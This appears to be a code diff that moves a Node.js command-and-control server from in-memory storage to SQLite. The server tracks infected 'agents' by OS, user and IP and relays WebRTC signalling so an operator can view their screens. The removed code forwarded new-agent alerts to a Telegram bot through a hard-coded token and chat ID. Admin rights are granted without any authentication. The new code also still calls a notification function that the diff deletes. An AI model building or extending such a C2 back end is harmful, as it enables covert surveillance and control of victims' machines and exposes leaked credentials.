@@ -4,261 +4,155 @@ const WebSocket = require('ws');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
 const fs = require('fs');
+const sqlite3 = require('better-sqlite3');
+
+// --- DATABASE SETUP ---
+const DB_PATH = path.join(__dirname, 'c2.db');
+const db = sqlite3(DB_PATH);
+
+// Enable WAL mode for performance
+db.pragma('journal_mode = WAL');
+
+// Initialize Tables
+db.exec(`
+    CREATE TABLE IF NOT EXISTS users (
+        id TEXT PRIMARY KEY,
+        os TEXT,
+        arch TEXT,
+        user TEXT,
+        ip TEXT,
+        last_seen INTEGER,
+        status TEXT DEFAULT 'Offline',
+        created_at INTEGER DEFAULT (strftime('%s', 'now'))
+    );
+    CREATE TABLE IF NOT EXISTS logs (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        message TEXT,
+        timestamp INTEGER DEFAULT (strftime('%s', 'now'))
+    );
+`);
 
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// --- CONFIGURATION ---
-const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
-const TELEGRAM_CHAT_ID = '6172226452';
-
-// In-memory Database
-let knownUsers = {}; 
-let clients = {}; 
-
-// Telegram Spam Protection
-const tgCooldown = {}; 
-const TG_COOLDOWN_MS = 3 * 60 * 60 * 1000; 
-
-// --- HELPER FUNCTIONS ---
-
-function logToFile(msg) {
- const timestamp = new Date().toISOString();
- const line = `[${timestamp}] ${msg}`;
- console.log(line);
- broadcastLogToAdmins(line);
-}
-
-function notifyTelegram(msg) {
- const userIdMatch = msg.match(/ID:\s*(\w+)/);
- const cooldownKey = userIdMatch ? userIdMatch[1] : 'global_tg_alert';
- 
- const now = Date.now();
- if (tgCooldown[cooldownKey] && (now - tgCooldown[cooldownKey]) < TG_COOLDOWN_MS) {
- return; 
- }
- 
- tgCooldown[cooldownKey] = now;
-
- const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
- require('https').get(url, (res) => {
- let data = '';
- res.on('data', (chunk) => { data += chunk; });
- res.on('end', () => {
- if (res.statusCode !== 200) {
- logToFile(`[TG ERROR] Status: ${res.statusCode}, Body: ${data}`);
- }
- });
- }).on('error', (e) => {
- logToFile(`[TG ERROR] ${e.message}`);
- });
-}
-
-function notifyAdmin(id, msg) {
- wss.clients.forEach(client => {
- if (client.readyState === WebSocket.OPEN && client.isAdmin) {
- client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
- }
- });
-}
-
-function broadcastToAdmin(sourceId, data) {
- wss.clients.forEach(client => {
- if (client.readyState === WebSocket.OPEN && client.isAdmin) {
- client.send(JSON.stringify({ targetId: sourceId, ...data }));
- }
- });
-}
-
-function broadcastLogToAdmins(line) {
- wss.clients.forEach(client => {
- if (client.readyState === WebSocket.OPEN && client.isAdmin) {
- client.send(JSON.stringify({ type: 'system_log', message: line }));
- }
- });
-}
-
-// --- HTTP ROUTING ---
 app.use(express.static(__dirname)); 
 
-app.get('/', (req, res) => {
- res.redirect('/admin.html');
-});
+// --- HELPER FUNCTIONS ---
+function logDB(msg) {
+    const timestamp = Date.now();
+    db.prepare("INSERT INTO logs (message) VALUES (?)").run(msg);
+    console.log(`[${new Date(timestamp).toISOString()}] ${msg}`);
+}
 
-app.get('/health', (req, res) => {
- res.writeHead(200, { 'Content-Type': 'text/plain' });
- res.end('OK');
-});
+function getAdminId() { return 'admin'; }
 
 // --- WEBSOCKET HANDLING ---
 wss.on('connection', (ws, req) => {
- let id = uuidv4().substr(0, 8);
- ws.id = id;
- ws.isAdmin = false;
- clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };
+    let clientId = uuidv4().substr(0, 8);
+    ws.id = clientId;
+    ws.isAdmin = false;
 
- logToFile(`[+] Client Connected: ${id}`);
- ws.send(JSON.stringify({ type: 'registered', id: id }));
+    // Register Admin if requested
+    ws.on('message', (msgRaw) => {
+        try {
+            const data = JSON.parse(msgRaw);
+            
+            if (data.type === 'register_admin') {
+                ws.isAdmin = true;
+                ws.adminId = clientId;
+                logDB(`[ADMIN] Connected via port ${req.socket.remotePort}`);
+                notifyAdmin(clientId, "🛡️ Admin Session Started");
+                broadcastToAdmins(ws, { type: 'refresh_users' });
+                return;
+            }
 
- let pingInterval = setInterval(() => {
- if (ws.readyState === WebSocket.OPEN) {
- ws.ping();
- } else {
- clearInterval(pingInterval);
- }
- }, 25000);
+            // Agent Connection Logic
+            if (data.type === 'info') {
+                const uniqueId = data.uniqueId || data.id; 
+                const now = Date.now();
+                
+                // Upsert into SQLite
+                const stmt = db.prepare(`
+                    INSERT INTO users (id, os, arch, user, ip, last_seen, status) 
+                    VALUES (?, ?, ?, ?, ?, ?, 'Online')
+                    ON CONFLICT(id) DO UPDATE SET 
+                        last_seen = ?, 
+                        status = 'Online',
+                        os = COALESCE(excluded.os, os),
+                        user = COALESCE(excluded.user, user),
+                        ip = COALESCE(excluded.ip, ip)
+                `);
+                stmt.run(uniqueId, data.os, data.arch, data.user, data.ip, now, now);
 
- ws.on('message', (msgRaw) => {
- try {
- const data = JSON.parse(msgRaw);
- logToFile(`[MSG] Received from ${id}: ${data.type}`);
+                // Notify Admins
+                wss.clients.forEach(client => {
+                    if (client.readyState === WebSocket.OPEN && client.isAdmin) {
+                        client.send(JSON.stringify({
+                            type: 'user_update',
+                            id: uniqueId,
+                            info: data,
+                            lastSeen: now
+                        }));
+                    }
+                });
+            }
 
- // 1. Admin Registration
- if (data.type === 'register_admin') {
- clients[id].isAdmin = true;
- ws.isAdmin = true; 
- logToFile(`[ADMIN] Connected with ID: ${id}`);
- Object.keys(knownUsers).forEach(uid => {
- ws.send(JSON.stringify({ 
- type: 'info', 
- id: uid, 
- os: knownUsers[uid].info.os, 
- user: knownUsers[uid].info.user, 
- ip: knownUsers[uid].info.ip 
- }));
- });
- return;
- }
+            // WebRTC Signaling Relay
+            if (['offer', 'answer', 'candidate'].includes(data.type)) {
+                // If Admin sends -> Forward to specific Agent
+                if (ws.isAdmin && data.targetId) {
+                    const targetWs = findAgentByUniqueID(data.targetId);
+                    if (targetWs && targetWs.readyState === WebSocket.OPEN) {
+                        targetWs.send(JSON.stringify(data));
+                    }
+                } 
+                // If Agent sends -> Forward to ALL Admins
+                else if (!ws.isAdmin && data.targetId === 'admin') {
+                    wss.clients.forEach(client => {
+                        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
+                            client.send(JSON.stringify(data));
+                        }
+                    });
+                }
+            }
+        } catch (e) {
+            logDB(`[ERR] Message parsing error: ${e.message}`);
+        }
+    });
 
- // 2. Agent Info Packet - THE CORE FIX
- if (data.type === 'info') {
- // Check if this WebSocket ID belongs to an EXISTING known user
- let existingUserId = null;
- for (const uid in knownUsers) {
- if (knownUsers[uid].ws && knownUsers[uid].ws.id === ws.id) {
- existingUserId = uid;
- break;
- }
- }
-
- if (existingUserId) {
- // UPDATE existing user record
- knownUsers[existingUserId].info = data;
- knownUsers[existingUserId].lastSeen = Date.now();
- knownUsers[existingUserId].status = 'Online';
- // Notify admins of update
- broadcastToAdmin(existingUserId, data);
- } else {
- // CREATE new user record
- knownUsers[id] = { 
- ws: ws, 
- info: data, 
- lastSeen: Date.now(), 
- status: 'Online' 
- };
- notifyAdmin(id, `🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`);
- broadcastToAdmin(id, data);
- notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os || 'Unknown'}\nUser: ${data.user || 'Unknown'}\nIP: ${data.ip || 'Unknown'}`);
- }
- } 
- // 3. Heartbeat
- else if (data.type === 'heartbeat') {
- // Update last seen for the connected socket
- if (clients[id]) {
- clients[id].lastSeen = Date.now();
- // Also update knownUsers if linked
- for(const uid in knownUsers) {
- if(knownUsers[uid].ws && knownUsers[uid].ws.id === ws.id) {
- knownUsers[uid].lastSeen = Date.now();
- knownUsers[uid].status = 'Online';
- break;
- }
- }
- }
- } 
- // 4. WebRTC Signaling - RELAY LOGIC
- else if (['offer', 'answer', 'candidate'].includes(data.type)) {
- // If Agent sends Offer -> Forward to ALL Admins
- if (!ws.isAdmin && data.targetId === 'admin') {
- wss.clients.forEach(client => {
- if (client.readyState === WebSocket.OPEN && client.isAdmin) {
- client.send(JSON.stringify({ 
- type: data.type, 
- targetId: id, 
- sdp: data.sdp,
- candidate: data.candidate
- }));
- }
- });
- }
- // If Admin sends Offer/Candidate -> Forward to SPECIFIC Agent
- else if (ws.isAdmin && data.targetId) {
- if (knownUsers[data.targetId] && knownUsers[data.targetId].ws) {
- const targetWs = knownUsers[data.targetId].ws;
- if (targetWs.readyState === WebSocket.OPEN) {
- targetWs.send(JSON.stringify(data));
- }
- }
- }
- // Fallback: Agent to Agent
- else if (data.targetId && knownUsers[data.targetId]) {
- const targetWs = knownUsers[data.targetId].ws;
- if (targetWs.readyState === WebSocket.OPEN) {
- targetWs.send(JSON.stringify(data));
- }
- }
- } 
- // 5. Join All (Broadcast)
- else if (data.type === 'join_all') {
- Object.keys(clients).forEach(cid => {
- if (cid !== id && clients[cid].ws.readyState === WebSocket.OPEN) {
- clients[cid].ws.send(JSON.stringify({
- type: 'join_request',
- from: id,
- timestamp: Date.now()
- }));
- }
- });
- } 
- // 6. Admin Request Join
- else if (data.type === 'request_join') {
- const targetId = data.targetId;
- if (knownUsers[targetId] && knownUsers[targetId].ws) {
- knownUsers[targetId].ws.send(JSON.stringify({
- type: 'start_join',
- from: id, 
- timestamp: Date.now()
- }));
- logToFile(`[ADMIN] Requested join to ${targetId}`);
- }
- }
- // Generic Fallback
- else {
- // Only log if it's not a known handled type
- if (!['registered', 'alert', 'info', 'screen_data', 'heartbeat', 'system', 'system_log'].includes(data.type)) {
-     notifyAdmin(id, `📺 Screen Active: ${id}`);
-     broadcastToAdmin(id, data);
- }
- }
- } catch (e) {
- logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
- }
- });
-
- ws.on('close', () => {
- delete clients[id];
- if (knownUsers[id]) {
- knownUsers[id].status = 'Offline';
- knownUsers[id].lastSeen = Date.now();
- }
- notifyAdmin(id, '🔴 User Disconnected');
- notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
- logToFile(`[-] Client Disconnected: ${id}`);
- });
+    ws.on('close', () => {
+        // Mark offline in DB
+        db.prepare("UPDATE users SET status = 'Offline', last_seen = ? WHERE id = ?")
+           .run(Date.now(), ws.id);
+        logDB(`[-] Client Disconnected: ${ws.id}`);
+        
+        wss.clients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN && client.isAdmin) {
+                client.send(JSON.stringify({ type: 'refresh_users' }));
+            }
+        });
+    });
 });
+
+function findAgentByUniqueID(uniqueId) {
+    // In a real scenario, we'd map unique IDs to WS instances
+    // For now, we iterate clients
+    for (const client of wss.clients) {
+        if (client.id === uniqueId) return client;
+    }
+    return null;
+}
+
+function broadcastToAdmins(sender, msg) {
+    wss.clients.forEach(client => {
+        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
+            client.send(JSON.stringify(msg));
+        }
+    });
+}
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
- logToFile(`C2 Server running on port ${PORT}`);
+    logDB(`C2 Server running on port ${PORT}`);
 });
